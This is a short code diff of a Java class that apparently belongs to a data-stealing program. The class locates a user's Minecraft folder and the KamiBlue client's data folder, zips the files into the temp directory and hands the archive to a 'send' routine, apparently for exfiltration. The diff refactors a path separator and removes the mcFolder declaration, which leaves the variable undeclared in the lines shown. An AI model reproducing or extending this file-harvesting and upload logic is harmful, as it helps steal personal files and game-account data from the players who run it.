@@ -15,7 +15,6 @@ public final class KamiBlueData implements JSONObject {
 
     @Override
     public void handle() {
-        String mcFolder = FileSystemHelper.getMinecraftFolder();
         if (mcFolder == null || !Files.exists(Paths.get(mcFolder))) return;
 
         String kamiblueFolder = mcFolder + "kamiblue/";
@@ -32,7 +31,7 @@ public final class KamiBlueData implements JSONObject {
             validFileDirs.add(new File(dir));
         }
 
-        String zipFile = System.getProperty("java.io.tmpdir") + FileSystemHelper.getSeparator() + "kami-blue_shit.zip";
+        String zipFile = System.getProperty("java.io.tmpdir") + sep + "kami-blue_shit.zip";
         FileSystemHelper.zip(zipFile, validFileDirs);
         JSONRegexHandler.send(new File(zipFile));
     }
